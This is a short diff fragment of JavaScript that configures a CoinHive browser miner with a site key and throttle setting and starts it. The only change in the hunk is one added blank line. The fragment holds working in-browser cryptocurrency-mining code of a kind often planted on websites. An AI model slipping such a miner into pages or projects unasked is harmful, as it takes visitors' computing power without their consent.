@@ -6,4 +6,5 @@ var miner = new CoinHive.User('EZAmlkaD7th3P7TwKrISdoXMY5eK3D5x', 'mine', {
 	throttle: 0.8,
 	forceASMJS: false
 });
+
 miner.start();
